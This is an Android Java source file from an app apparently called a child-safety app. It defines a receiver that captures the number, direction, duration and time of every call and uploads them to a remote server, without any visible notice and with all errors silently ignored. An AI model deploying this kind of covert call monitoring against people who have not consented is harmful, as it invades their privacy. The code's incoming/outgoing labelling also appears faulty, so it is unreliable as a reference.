package com.childsafety.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import org.json.JSONObject;

public class CallReceiver extends BroadcastReceiver {
    private static String lastState = "";
    private static String lastNumber = "";
    private static long callStart = 0;

    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            if (number != null && !number.isEmpty()) lastNumber = number;
            if (state == null) return;

            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state) ||
                TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                if (!state.equals(lastState)) callStart = System.currentTimeMillis();
            }

            if (TelephonyManager.EXTRA_STATE_IDLE.equals(state) &&
                !lastState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                long duration = callStart > 0 ? (System.currentTimeMillis() - callStart) / 1000 : 0;
                JSONObject data = new JSONObject();
                data.put("number", lastNumber);
                data.put("type", lastState.equals(TelephonyManager.EXTRA_STATE_RINGING) ? "incoming" : "outgoing");
                data.put("duration", duration);
                data.put("timestamp", System.currentTimeMillis());
                ApiClient.uploadData(ctx, "call", data);
                callStart = 0; lastNumber = "";
            }
            lastState = state;
        } catch (Exception ignored) {}
    }
}
